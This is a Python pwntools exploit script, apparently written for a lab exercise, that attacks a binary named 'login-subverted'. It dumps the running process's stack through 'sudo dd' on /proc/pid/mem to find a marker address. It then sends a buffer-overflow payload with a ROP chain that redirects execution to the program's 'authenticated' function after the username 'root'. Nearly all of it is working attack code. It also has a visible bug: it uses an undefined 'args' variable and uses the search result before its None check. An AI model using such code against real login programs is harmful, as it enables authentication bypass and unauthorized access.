#this is our exp
#If you need more explanation, please tell us
#the experment is centos9, g++ version is 11.5
#you need install pwntools in python and openssl in centos9. 
#Please do not modify anything else in centos9, or the exp might be useless
#and the backdoor may be a little different from the way it should be 
from pwn import *

output_file = open('log','wb')
error_file = open('log_err','wb')
context.log_level = 'debug'
elf = ELF('./login-subverted')
printf_addr = elf.symbols['printf']
buf_addr = 0x405180 + 500
labela1_addr = elf.symbols['labela']
cin_addr = elf.symbols['_ZSt3cin']
istream_addr = elf.symbols['_ZStrsIcSt11char_traitsIcEERSt13basic_istreamIT_T0_ES6_PS3_']
reject_addr = elf.symbols['_Z8rejectedNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE']
gadget_addr = elf.symbols['labela'] + 4
rbx = 50
rcx = 67
authenticated_addr = elf.symbols['_Z13authenticatedNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE']
main_addr = elf.symbols['main']
string_addr = 0x4030af
ret_addr = elf.symbols['main'] + 0x80
p = process('./login-subverted',stderr=error_file)

import argparse


get_pid_cmd = lambda process_name: f"""
ps aux | grep ./{process_name} | grep -v grep | awk '{{print $2}}'
"""

get_proc_mem_map_cmd = lambda pid: f"""
cat /proc/{pid}/maps | grep stack | awk '{{print $1}}' | head -n 1
"""

dump_cmd = lambda start_address, end_address, pid, output: f"""
start_address_dec=$(printf "%d" 0x{start_address})
length_dec=$((0x{end_address} - 0x{start_address}))

sudo dd if=/proc/{pid}/mem bs=1 skip=$start_address_dec count=$length_dec 2>/dev/null | hexdump -C > {output}
"""


def get_mem_address_of_value_from_dump(dump_file, value):
    value_bytes = bytes.fromhex(value)
    value_bytes = value_bytes[::-1]

    with open(dump_file, 'r') as f:
        for line in f:
            parts = line.split()
            if len(parts) < 2:
                continue

            line_address = int(parts[0], 16)
            address_length = len(parts[0])

            hex_data = ''.join(parts[1:17])
            data_bytes = bytes.fromhex(hex_data)

            index = data_bytes.find(value_bytes)
            if index != -1:
                found_address = line_address + index
                formatted_address = f"{found_address:0{address_length}x}"
                return formatted_address

    return None


def get_pid(process_name):
    import subprocess
    pid = subprocess.check_output(get_pid_cmd(process_name), shell=True)
    return pid.decode().strip()


def get_proc_mem_map(pid):
    import subprocess
    mem_map = subprocess.check_output(get_proc_mem_map_cmd(pid), shell=True)
    mem_range = mem_map.decode().strip().split('-')
    start_address = mem_range[0]
    end_address = mem_range[1]
    print(f"[stack] start_address: {start_address}, end_address: {end_address}")
    return start_address, end_address


def dump_memory(pid, output):
    import subprocess
    start_address, end_address = get_proc_mem_map(pid)
    subprocess.run(dump_cmd(start_address, end_address, pid, output), shell=True)
    return start_address


pid = get_pid("login-subverted")
print(pid)
start_address = dump_memory(pid, "result.txt")
res = get_mem_address_of_value_from_dump("result.txt","abcddcba")
rbp_addr = int(start_address, 16) + int(res, 16)
if res is not None:
    print(f"address of value '{args['value']}' found: {int(start_address, 16) + int(res, 16):#x}")
else:
    print("address not found")

#user_input = input("请输入一些内容：")
#first_line = (p.recvline().split())[6]
#print("first_line " + first_line.decode())
#rbp_addr = int(first_line) + 0x34
violet_addr = elf.symbols['_Z6violetB5cxx11']
reject_addr = elf.symbols['_Z8rejectedNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE']
payload = flat([b'a' * 136 + p64(0) + p64(rbp_addr) + p64(gadget_addr) + p64(rcx) + p64(rbx) +p64(cin_addr) + p64(buf_addr) + p64(istream_addr)  + p64(gadget_addr) + p64(rcx) + p64(rbx) + p64(buf_addr) +p64(0) + p64(authenticated_addr)  ])
p.sendline('root')
print('here')
p.sendline(payload)
payload = flat([b'root' * 2 + p64(0)])
p.sendline(payload)
p.interactive()
#print(f'cin: {cin_addr}  gadget: {gadget_addr} success_addr {success_addr} ret_addr {ret_addr}')
